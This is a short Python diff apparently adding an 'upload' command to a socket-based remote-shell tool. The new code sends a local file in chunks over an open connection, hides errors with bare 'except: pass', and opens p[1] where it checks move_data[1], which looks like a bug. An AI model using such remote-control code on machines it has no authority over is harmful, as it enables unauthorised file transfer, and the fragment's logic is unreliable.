@@ -75,5 +75,20 @@ while True:
    f.close()
  except:
   pass
+
+ try:
+  if move_data[0]=="upload" and move_data[1]!='':
+   c.send(codecs.encode(move_data[0]+" "+move_data[1]))
+   f= open(p[1],"rb")	
+   print("file readed")
+   data = f.read(1024)
+   while data:
+    c.send(data)
+    data = f.read(1024) 	 
+   print("file sent")	  
+   f.close()	
+ except:
+  pass
+  
  if shell == "close":
   c.close()
